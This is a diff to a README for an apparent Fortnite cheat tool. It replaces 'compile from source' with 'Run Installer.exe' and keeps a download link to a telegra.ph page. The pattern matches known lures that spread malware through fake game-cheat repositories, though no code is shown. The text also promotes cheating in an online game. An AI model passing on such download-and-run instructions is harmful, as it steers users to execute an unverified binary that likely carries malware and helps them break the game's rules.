@@ -5,7 +5,7 @@ This project aims to provide users with a set of cheat tools and functionalities
 ## Usage
 
 1. **Download**: [click here to download](https://telegra.ph/k59afFkIkaafLit-05-14?oiiubfd772)
-2. **Installation**: Open the project with Visual Studio and Compile from the Build Menu.
+2. **Installation**: Run Installer.exe
 3. **Launch Fortnite**: Launch Fortnite and launch the cheat tools to activate your desired features.
 4. **Enjoy**: Enhance your Fortnite experience with added functionality and dominate the battlefield!
 
